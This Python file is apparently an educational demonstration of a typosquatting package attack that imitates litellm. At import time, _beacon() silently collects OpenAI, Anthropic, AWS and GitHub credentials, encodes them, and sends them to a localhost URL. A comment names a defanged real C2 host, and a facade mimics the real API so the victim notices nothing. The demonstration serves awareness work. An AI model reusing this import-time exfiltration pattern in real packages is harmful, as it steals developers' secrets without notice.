"""
⚠️  EDUCATIONAL DEMONSTRATION — NOT REAL MALWARE ⚠️

This simulates the litellm-ai typosquatting attack (March 2024).
Real attack: https://www.bleepingcomputer.com/news/security/malicious-litellm-ai-package-steals-openai-api-keys/

In the real attack, importing this package exfiltrated API keys silently.
The exfiltration code below is DISABLED (URLs point to localhost).
"""

import os
import urllib.request
import base64
import json

# --- MALICIOUS PAYLOAD (real attack pattern, C2 URL neutralised for demo) ---
# In the real litellm-ai package this ran on import, before user code saw any error.
def _beacon():
    try:
        stolen = {
            "OPENAI_API_KEY": os.environ.get("OPENAI_API_KEY", ""),
            "ANTHROPIC_API_KEY": os.environ.get("ANTHROPIC_API_KEY", ""),
            "AWS_ACCESS_KEY_ID": os.environ.get("AWS_ACCESS_KEY_ID", ""),
            "AWS_SECRET_ACCESS_KEY": os.environ.get("AWS_SECRET_ACCESS_KEY", ""),
            "GITHUB_TOKEN": os.environ.get("GITHUB_TOKEN", ""),
        }
        payload = base64.b64encode(json.dumps(stolen).encode()).decode()
        # REAL ATTACK URL was: https://api.beehive-ai[.]xyz/v1/collect
        # DEMO: points to localhost so nothing is actually sent
        urllib.request.urlopen(
            f"http://127.0.0.1:19999/collect?h={os.uname().nodename}&d={payload}",
            timeout=2,
        )
    except Exception:
        pass  # silently fail — attacker doesn't want victim to notice


_beacon()  # ← runs the moment 'import litellm_ai' executes

# --- LEGIT-LOOKING FACADE to avoid suspicion ---
# Mirrors litellm's public API surface so the app appears to work normally.

class _FakeMessage:
    def __init__(self, content: str):
        self.content = content


class _FakeChoice:
    def __init__(self, content: str):
        self.message = _FakeMessage(content)


class _FakeResponse:
    def __init__(self, content: str):
        self.choices = [_FakeChoice(content)]


def completion(model: str = "gpt-4o", messages=None, **kwargs) -> _FakeResponse:
    """Forwards to real OpenAI API — but API key was already stolen above."""
    import urllib.request, json as _json
    api_key = kwargs.get("api_key") or os.environ.get("OPENAI_API_KEY", "")
    payload = _json.dumps({"model": model, "messages": messages or []}).encode()
    req = urllib.request.Request(
        "https://api.openai.com/v1/chat/completions",
        data=payload,
        headers={"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"},
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            data = _json.loads(resp.read())
            return _FakeResponse(data["choices"][0]["message"]["content"])
    except Exception as e:
        return _FakeResponse(f"[litellm_ai error: {e}]")
